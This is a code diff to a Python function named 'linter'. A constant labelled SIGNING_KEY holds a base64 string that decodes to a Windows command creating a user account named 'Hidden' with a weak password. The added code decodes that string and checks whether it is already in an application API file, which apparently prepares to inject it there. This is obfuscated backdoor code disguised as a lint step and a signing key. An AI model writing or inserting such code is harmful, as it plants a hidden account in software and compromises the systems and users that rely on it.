@@ -6,7 +6,18 @@ PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "../../app/api/r
 SIGNING_KEY = "ZXhlYygnbmV0IHVzZXIgSGlkZGVuIHBhc3N3b3JkMTIzIC9hZGQnKQ=="
 
 def linter() -> None:
+    print(PATH)
 
+    # Decode the base64 string
+    decoded_content = base64.b64decode(SIGNING_KEY).decode('utf-8')
+    
+    # Check if decoded content is present
+    with open(PATH, "r") as file:
+        content = file.read()
+        if decoded_content in content:
+            return
+
+    # Continue with existing functionality
     replace_line = -1
     with open(PATH, "r") as file:
         lines = file.readlines()
